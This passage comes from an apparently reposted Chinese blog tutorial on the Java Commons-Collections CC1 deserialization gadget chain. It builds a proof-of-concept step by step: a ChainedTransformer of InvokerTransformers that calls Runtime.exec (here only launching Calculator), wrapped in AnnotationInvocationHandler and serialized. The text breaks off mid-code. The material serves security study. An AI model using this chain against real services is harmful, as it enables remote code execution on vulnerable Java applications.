data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h3 id=\"最后怎么才能触发回调呢就是向map中放入一个新的元素\"><a class=\"anchor\" href=\"#最后怎么才能触发回调呢就是向map中放入一个新的元素\">#</a> 最后，怎么才能触发回调呢，就是向 Map 中放入一个新的元素：</h3>\n<h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>outerMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h3 id=\"链子已经找好了现在就是poc怎么生成的问题了\"><a class=\"anchor\" href=\"#链子已经找好了现在就是poc怎么生成的问题了\">#</a> 链子已经找好了，现在就是 poc 怎么生成的问题了</h3>\n<h2 id=\"如何生成一个可利用的序列化对象\"><a class=\"anchor\" href=\"#如何生成一个可利用的序列化对象\">#</a> <strong>如何⽣成⼀个可利⽤的序列化对象？</strong></h2>\n<p>现在我们有了 poc 的简易脚本：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>vulhub<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Ser</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformedMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CommonCollections1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>outerMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>其实这个漏洞触发的核心就是 outerMap.put 插入一个数据来触发漏洞，但在实际的反序列化时，我们需要找到一个类，他在反序列化的 readObject 逻辑中有类似的写入操作</p>\n<p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的 readObject</p>\n<p>方法（这是 8u71 以前的代码，8u71 以后做了一些修改，这个后面再说）：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">throws</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// Check to make sure that types have not evolved incompatibly</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">AnnotationType</span> annotationType <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>annotationType <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalArgumentException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// Class is no longer an annotation type; time to punch out</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InvalidObjectException</span><span class=\"token punctuation\">(</span>\"<span class=\"token class-name\">Non</span><span class=\"token operator\">-</span>annotation type in</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>annotation serial stream\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> memberTypes <span class=\"token operator\">=</span> annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// If there are annotation members without values, that</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// situation is handled by the invoke method.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValue <span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>memberValues<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> memberType <span class=\"token operator\">=</span> memberTypes<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>memberType <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// i.e. member still exists</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>memberType<span class=\"token punctuation\">.</span><span class=\"token function\">isInstance</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ExceptionProxy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>value<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"[\"</span> <span class=\"token operator\">+</span> value <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>核心的逻辑就是 Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet () 和</p>\n<p>memberValue.setValue(...) 。</p>\n<p>memberValues 就是反序列化后得到的 Map，也是经过了 TransformedMap 修饰的对象，这里遍历了它</p>\n<p>的所有元素，并依次设置值。在调用 setValue 设置值的时候就会触发 TransformedMap 里注册的</p>\n<p>Transform，进而执行我们为其精心设计的任意代码。</p>\n<p>所以，我们构造 POC 的时候，就需要创建一个 AnnotationInvocationHandler 对象，并将前面构造的</p>\n<p>HashMap 设置进来：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> clazz <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">Constructor</span> construct <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>construct<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> construct<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Retention</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> outerMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>这里因为 sun.reflect.annotation.AnnotationInvocationHandler 是在 JDK 内部的类，不能直接使</p>\n<p>用 new 来实例化。我使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化</p>\n<p>了。</p>\n<p>AnnotationInvocationHandler 类的构造函数有两个参数，第一个参数是一个 Annotation 类；第二个是参数就是前面构造的 Map。</p>\n<p>AnnotationInvocationHandler 类的构造函数有两个参数，第一个参数是一个 Annotation 类；第二个是</p>\n<p>参数就是前面构造的 Map。</p>\n<h3 id=\"annotationinvocation类的构造函数有两个参数第一个是annotation类第二个参数就是前面构造的map\"><a class=\"anchor\" href=\"#annotationinvocation类的构造函数有两个参数第一个是annotation类第二个参数就是前面构造的map\">#</a> AnnotationInvocation 类的构造函数有两个参数，第一个是 Annotation 类，第二个参数就是前面构造的 Map</h3>\n<p>什么是 Annotation 类，为什么需要用到这个类呢</p>\n<h1 id=\"为什么需要用到反射\"><a class=\"anchor\" href=\"#为什么需要用到反射\">#</a> 为什么需要用到反射？</h1>\n<p>构造 AnnotationInvocationHandler 对象，就是反序列化利用链的七点了，我们通过如下代码将这个对象生成序列化流</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">ByteArrayOutputStream</span> barr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>oos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>将其拼接到简易版本的 poc 里面去</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/eb82bbef63eb48a3938bc0b033e6ae31.png\" alt=\"img\" /><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" />编辑</p>\n<p>报了错，原因是 Java 中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给 ConstantTransformer 的是 Runtime.getRuntime (),Runtime 类是没有实现 java.io.Serializable 接口的，所以是不允许被序列化的。</p>\n<p>那么怎么避免这个错误呢，学了反射我们可以知道，我们可以直接通过反射来获取上下文中的 Runtime 对象，而不需要直接使用这个类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Method</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 通过 Java 反射 (getMethod) 获取 Runtime 类的 getRuntime () 方法。Runtime 是 Java 负责执行系统命令的类。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Runtime</span> r <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">)</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 调用 getRuntime () 方法，获得 Runtime 实例，invoke (null) 表示该方法是 静态方法。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        r<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//exec () 方法用于执行系统命令</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>转换成 Transformer 的写法就是：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token 